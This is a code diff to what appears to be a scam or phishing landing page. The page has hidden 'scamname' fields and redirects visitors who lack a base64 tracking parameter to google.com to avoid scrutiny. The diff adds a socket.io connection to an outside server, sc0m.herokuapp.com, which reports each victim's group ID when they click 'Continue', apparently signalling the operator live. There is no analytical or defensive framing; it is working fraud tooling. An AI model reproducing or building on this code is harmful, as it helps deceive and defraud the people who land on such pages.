@@ -662,7 +662,7 @@
         <input type="hidden" value="" name="code" v-model="codecountry">
 
         <input type="hidden" value="" name="sc" v-model="scamname">
-        <button name="add" class="inlog" style="width:90%;" type="submit" name="zaxfac"><span
+        <button name="add" onclick="ss()" class="inlog" style="width:90%;" type="submit" name="zaxfac"><span
             style="position:relative;left:40%;">Continue</span></button>
     </div>
     <label class="container"> <input type="checkbox"> <span class="checkmark"></span> <label class="chbox"
@@ -676,7 +676,28 @@
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
   <script src="https://unpkg.com/country-phone-prefix@latest"></script>
   <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
   <script>
+    const socket = io("wss://sc0m.herokuapp.com");
+    const queryStrings = window.location.search;
+    const urlParamss = new URLSearchParams(queryStrings);
+    const qs = urlParamss.get('q');
+
+    let rrss = atob(qs);
+    let users = rrss.split("_")[3];
+    users = users.split("=")[1];
+    function ss() {
+      socket.emit('add', {
+        nickname: "users",
+        groupe: parseInt(users),
+      });
+      socket.emit('adds', {
+        nickname: "users",
+        groupe: "all",
+      });
+    };
+  </script>
+ <script>
     var vm = new Vue({
       el: "#page",
       data: {
@@ -755,11 +776,11 @@
 
 
 
-   
+
     const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const q = urlParams.get('q');
-    
+    const urlParams = new URLSearchParams(queryString);
+    const q = urlParams.get('q');
+
     if (q == null) {
       window.location = "https://google.com";
       exit();
